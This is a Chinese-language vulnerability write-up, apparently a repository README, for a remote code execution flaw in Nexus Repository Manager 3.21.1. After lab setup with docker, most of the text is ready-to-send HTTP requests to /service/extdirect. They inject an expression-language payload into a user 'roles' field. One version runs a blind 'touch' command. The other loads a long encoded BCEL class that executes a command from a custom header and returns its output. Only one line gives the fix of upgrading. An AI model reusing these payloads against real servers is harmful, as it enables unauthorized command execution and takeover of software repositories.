# Nexus_Repository_Manager3_Vulnerabilities
Nexus Repository Manager3 - 远程执行代码漏洞回显payload

**环境搭建**

使用`https://hub.docker.com/r/sonatype/nexus3/tags`,pull下漏洞版本的docker

```java
查看docker history
sudo docker history sonatype/nexus3:3.21.1 
查看docker history 完整命令
sudo docker history sonatype/nexus3:3.21.1 --no-trunc
拉取镜像
sudo docker pull sonatype/nexus3:3.21.1
启动
sudo docker run -it -d --name nexus -p 8081:8081 -p 5050:5050 --name nexus sonatype/nexus3:3.21.1
sudo docker exec --user root -it 739eeacbfe93 bash
```

**无回显poc**

```
POST /service/extdirect HTTP/1.1
Host: **.**.**.191:8081
Content-Length: 350
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.01485219710140373
Content-Type: application/json
Accept: */*
Origin: http://34.92.64.191:8081
Referer: http://34.92.64.191:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: harbor-lang=zh-cn; grafana_session=5eab6ca0a546d0df32ab22b1d36dc996; NX-ANTI-CSRF-TOKEN=0.01485219710140373; NXSESSIONID=f6d08b8b-ec8a-45fd-8539-ea034a9f31b2; _ga=GA1.1.1917822484.1597226847; _gid=GA1.1.1059631663.1597226847
Connection: close

{"action":"coreui_User","method":"create","data":[{"userId":"3","version":"","firstName":"test","lastName":"test","email":"test@test.com","status":"active","roles":["$\\X{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /tmp/rce')}"],"password":"admin"}],"type":"rpc","tid":33}
```

![无回显](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/2ecc9372-574a-4864-b97f-3577e89a8ab8/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20200821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200821T104424Z&X-Amz-Expires=86400&X-Amz-Signature=53e3a021cf7614e680b1bf723bd1ca1da65959035579d11e354d8ed11a7bf68e&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%221.png%22)

![touch /tmp/rce](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/47f6ea38-633f-45a5-a6e8-a1821435db48/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20200821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200821T104449Z&X-Amz-Expires=86400&X-Amz-Signature=0a5f206016d9051db4b419b47d359d696f979ba06a72abbc7da25ede3e3b3025&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%222.png%22)

**回显poc**

![bcel](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a5a677bf-766b-435a-b2d2-cf07348add90/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20200821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200821T104526Z&X-Amz-Expires=86400&X-Amz-Signature=a39d414d2976d9a18e635f4b04154ba5c0dee34463f240dc879d80abd028cf6b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

选择JDK内置的`com.sun.org.apache.bcel.internal.util.ClassLoader`来动态加载我们的类

```
${''.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$' + code).newInstance()
```

最终poc

```
POST /service/extdirect HTTP/1.1
Host: 192.168.233.130:8081
Content-Length: 4083
X-Requested-With: XMLHttpRequest
hu3sky_command: ls -al
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.9332502931671067
Content-Type: application/json
Accept: */*
Origin: http://192.168.233.130:8081
Referer: http://192.168.233.130:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: security_level=0; NX-ANTI-CSRF-TOKEN=0.9332502931671067; NXSESSIONID=395d2b71-9ae5-4020-81b9-9062d9f8a1cc
Connection: close

{"action":"coreui_User","method":"create","data":[{"userId":"3","version":"","firstName":"test","lastName":"test","email":"test@test.com","status":"active","roles":["$\\X{''.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$7b$I$A$A$A$A$A$A$A$8dV$d9s$UE$Y$ff5$bb$9b$99L$s$d7$q$9b$a4$T$82$82$B6$Jl$Q9d$40E$$E$c2$n$89$60$40$c5$c9$a4C6$d9$cc$ac3$b3$n$u$de7$o$e2$N$de7$8a$fa$60$95$b5$a1$a4$b4$f4$85$H$ff$E_$f4$c9$X_$7c$b1$ca$w$v$f1$eb$d9$5d$b2$J$ab$b8$3b$d5$d3$fd$dd$df$d7$bf$af$7b$7e$fc$fb$9b$ef$A$ac$c0$X$g$9a$b1MC$E$bd$K$b6$ab$d8$a1$n$8e$9d$gv$e1v9$ecV$d1$t$v$fd$w$eeP$b0G$c5$5e$VwJ$95$BI$dd$a7b$bf$86y$b8K$c5$ddr$7d$8f$8au$K$O$c8$e9$bd$K$y$N$83$b0U$M$v$Q$w$86U$iT1$a2$m$a5bT$c5$98$82$b4$86q8rp5dp$9f$86$f9$f0$U$f8$K$C$N$8b$e1iX$84$ac$i$s$U$i$d2$d0$z$c3$ec$c6$a4$8a$c3$f2$7d$bf$86V$3c$m$87$pR$e6A$a9M$c3j$3c$a4$e0a$N$x$f1$88$82G$Z$w$d6$a5$9cTp$pC$q$d1$b9$87$n$ba$d1$j$S$M$b5$bd$vG$ec$c8$8e$P$K$af$df$gL$T$a5$ea$a0$Iv$L$3f$e3$3a$3e$ad$aa$fb$C$cb$k$dbneB$$$VF$c1c$94$Q$e5F$b9P$K$U$3c$F$ca$a0m$9e$b4E$sH$91$W$83$ba$ceN$87$ce$u$Ab$f5$b9Y$cf$W$5bR$d2z$e3f$7b$c4$3d$b0W$Mnt$9d$40L$G$c9Qk$c2$d2q$3d$d6$e8x$iO0$d4IBO$dar$O$f6$f4$8fx$c2$gb$d0$83p$d2$eb$daV$da$d7$f1$q$9e$a2$mt$3c$8dgt$3c$8b$a3$M$jR$t$vu$92$fd$d3$a2$j$rsJ$40$c7s8$c6$Q$L$f2i6$ec$ef$9d$f6$b4spT$d8$c1Z$86$ae$ffc$a9c$b3$Tx$87$c9$d4$84$95$ce$K$j$cf$e3$b8$8e$Xp$82a$85$ed$8e$t$7dw88dyb$5c8$81$eb$f9I$car$d4O$O$8d$3aI_x$Ti$R$q$7d$7f$3c9$5d$C$j$_$e2$r$w$9aW$u$ba$8e$97q$9cvf$3a$bc$8di$cb$a7$c4_$c1$ab3$ea$93$8fZ$c1k$3a$5e$c7I$86J$da$b9$bd$5e$w$Q$k$a5$X$8a$a5$dc$9e$5d$5e$ca$b9DU$3cq_V$f8$BmJ$b8$cb$85$85T$bc$95$S$94$o$r$f6$fb$C$d2$3d$c8P3$92$bd$ce$l$3b$7c$80$92$h$b7$i$da$Q0$b4$V$edo$c8$O$P$LO$Mmu2$d9$804$845$ae$e0$94$8e7$f0$a6$8e$b7$f0$b6$82wt$bc$8b$f7$e4$k$bf$cf$d04$5bow$c1$_$_2J$M$e5yR$f3$D$j$l$ca$C7$cf$8enC6$95$Oe$3e$c2$c7$ML$d3$f1$JN$e88$8dOu$7c$sAuF$O$eb$b0$a6X$92P$f7$SXu$7c$$Y$9cR$ebq$c4d$d6$ef$99$85$cf$Z$$$3d1$9c$a6$8a$f7lI$894$95$a1$da$cez$kmr$R$a7$8d$89$ce$de$d9$e8$rL$d5Qu7$J$3bM$90$Y$wh$$M$f4$ceNdm$a9$ee$MGd$a2$da$X$c1$cd$b6$z$7c$3f$V$827$9a$d8$t$7b8B$96$Z$W$r$$Grg9p$x$c3$ae$b7$c3$g$t$fd$85W$f0$l$C$8e4Tr$Q$ce$a9z$89r$C$K$J$e4M$ceL$be$60$93N$j$c2$Yu$zC$bc$5c$94$fb$u5$b2$d0$97$cd$I$cf$ce$fb$91X$dc$$$82$R$97$ca$b4$beL$98$fb$_$8b$a2$5c$e1$f2$W$c8$7f$cb$bf$f1$u$b4$943$e1$8eQ$e8k$ca$84V$e6t$u$5b$d3$fai$da$ee$ac$T$a4d$v$c2$de$w$$$e23$eaR$m$93bTL$K$9ba$f1$Vvb$97$e7$cam$9f$e9$a9$40$a4$ce$qO$r$fdB$60$zz$9b$d9H$b2$Q$89$b2$M$J$a3$86iV$be$e3B$aa$g$kyt$3bP$a5$acLF8$ff$D$b73zR$e2$tp$8b$87H$ec$90$3c$83f$e1$a0h$82$dc$c5$86$d3Y$7f$84$dev$da$95$XOmF$k$5c$e1$ed$d3$efY$b6$a0Km5$dd$b6$f2$X$a1$f3$87$$$M$gMZ$b5$d3$9b$8e$q$c4$ba$a6$c0$be$82$3c$9c$d6$d2X$R$S$p$a8$94$cd$8f9R42F$d4y$qp$e1$y$e6l3$oF4$87Xo7$8d$V$dd$5d9$u$db$N$f5$y$ww$y54$a2$9bQ$k$95$i$k$5dB$ac$efQE$8f$Z3t$920$xx$85Q$ze$U$ae$8421S$e5$eaw$ab$w$p$ab$b4$b8$W$af$fc$80$bd$c5$d5$b8$b6$dc$ac$e2U$e7$d9Q$ae$f0$w$b2a$ea$5c$3f$cf$8ep$3d$87$9a$ij$8d$ba$i$eaO$b1t$b86$Mi$ae$9aW$87$e6$aa$rM1kxM$u$da$40$8fY$cbk$8d$c6$c8$b7$88$e7$d0$c4kh$d2$9cC$8bYWJ$ad$xR$eby$bd$b4$c9$8b$8c$fa$C$e3$7b$b4$9aF$de_$9b$f4$d7$c0$hB$7f$Ny$7f$8d$bcq$da_$9c$c7$8d$b9E$D$8dE$cbM$a5$d4$a6$o$b5$b9$94$da$5c$a4$b6$f0$W$e9$a9$3dJ$8c$81$881$afOr$5bh$d5L$ab$ab$fa$c2x$e6$99$dc$b8$dal$3d$87$f9$Dg$b1$80$f3$i$ae$c9$a1c$K$L$cd$b6sX4p$O$8b$Hx$db$U$SS$e84$e7$f2$b99t$N$98$ed$e71$ff$i$ba$H$a6$b0$84$b7$e6$b0$94$b7$d3$60$qi$c8$a1$c7l$3d$7d$f1$tnH$c62NE$bdV$w$z$e7$94$eeuOh$ec$f4$df$b6D$c8$9c$Q$ng$d0Ec5$a2$a8$81$8eZ$d4$a3$8e$AVO$802$b0$Q$N$f4e$d5H$c8$89c$3d$9a$b0$958$3b$d1$82$U8$i$fa$d2$3a$846$i$c1$5c$i$p$3c$9d$c4Ux$HW$d3$9d3$l_c$B$7e$c45$f8$F$j$b8$80$c5LE$82$d5$a0$935$a3$8bu$a0$9b$99X$c2va$v$hF$92$j$c32v$C$d7$b2$8f$b0$9c$e5$b0$82$fd$80$95$ecg$acb$bfb5$fb$N$d7$b3$df$e9f$fa$D$z$ec$_$dc$88$h$u$d2$_$R$bb$88$fd$a8R$40$dfU7$vX$af$e0$e6pRui$c2$I$f3$X$d9$3e$b4$ff$a7LH$5e_$c2$cf$_7$5cF$a1gc$f8lR$b0$Z$94P$82V$X$a9$qW$8a$e1O$c4$b0$85B$8eR$T$ae$84$8a$5b$$u$eb$d6B$b7R$l$ad8$Nu$h$f5$dd$aa$af$K$adZA$b2$f9$adi$o$7d$d9$c2$b2$7d$x$a0$d0_E$V$b4$b0$M$K$e6lQp$ab4$bd5$dc$cb$db$fe$B$ea$ea$b4$ba$c3$L$A$A').newInstance()}"],"password":"admin"}],"type":"rpc","tid":33}
```

![回显](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/bd9d7539-7208-4efa-b374-e1a7c2a71d8e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20200821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200821T104541Z&X-Amz-Expires=86400&X-Amz-Signature=ddb209e8cd77ac1f180af7e393195f8ad7292fc44f48ee81cd20bc23a9eb54f7&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

**修复**

升级至最新版本或 Nexus Repository Manager 3.x OSS / Pro > 3.21.1
